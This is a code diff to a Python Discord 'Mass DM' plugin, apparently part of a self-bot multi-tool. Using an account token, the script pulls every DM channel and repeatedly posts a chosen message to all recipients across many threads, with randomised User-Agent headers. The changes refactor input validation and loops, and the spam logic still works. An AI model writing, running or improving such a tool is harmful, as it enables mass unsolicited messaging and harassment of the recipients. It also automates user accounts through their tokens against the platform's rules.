@@ -1,4 +1,4 @@
-# Copyright (c) 2025 v4lkyr0/v4lkyr_
+# Copyright (c) 2025 v4lkyr0
 # See LICENSE file for details
 
 from Plugins.Utils import *
@@ -21,21 +21,23 @@ try:
     if not message:
         ErrorInput()
 
-    repetitions = int(input(f"{INPUT} Repetitions {red}->{reset} ").strip())
-    if not repetitions or repetitions < 0:
+    try:
+        repetitions = int(input(f"{INPUT} Repetitions {red}->{reset} ").strip())
+    except:
         ErrorNumber()
 
-    print(f"{INFO} Sending Dm..", reset)
+    if repetitions <= 0:
+        ErrorNumber()
+
+    print(f"{LOADING} Sending Dm..", reset)
 
     def MassDm(token, channels, message):
         for channel in channels:
-            for user in [x["username"] for x in channel["recipients"]]:
+            for user in [x["username"] for x in channel.get("recipients", [])]:
                 try:
-                    headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": RandomUserAgents()}
-                    payload = {"content": message}
-
-                    response = requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers=headers, json=payload)
-                    if response.status_code == 200:
+                    headers  = {"Authorization": token, "Content-Type": "application/json", "User-Agent": RandomUserAgents()}
+                    response = requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages", headers=headers, json={"content": message})
+                    if response.status_code in [200, 201]:
                         print(f"{SUCCESS} Status:{red} Sent   {white}| Username:{red} {user}", reset)
                     else:
                         print(f"{ERROR} Status:{red} Failed {white}| Username:{red} {user}", reset)
@@ -44,24 +46,23 @@ try:
                 time.sleep(0.1)
 
     channel_ids = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': token}).json()
-    threads   = []
 
-    rep = 0
-    for i in range(repetitions):
-        rep += 1
-        if not channel_ids:
-            print(f"{ERROR} No Dm found!", reset)
-            Continue()
-            Reset()
-        for channel in [channel_ids[i:i + 3] for i in range(0, len(channel_ids), 3)]:
+    if not channel_ids:
+        print(f"{ERROR} No Dm found!", reset)
+        Continue()
+        Reset()
+
+    threads = []
+    for _ in range(repetitions):
+        for channel in [channel_ids[j:j+3] for j in range(0, len(channel_ids), 3)]:
             t = threading.Thread(target=MassDm, args=(token, channel, message))
             t.start()
             threads.append(t)
             time.sleep(0.1)
-            
+
     for thread in threads:
         thread.join()
-    
+
     Continue()
     Reset()
 
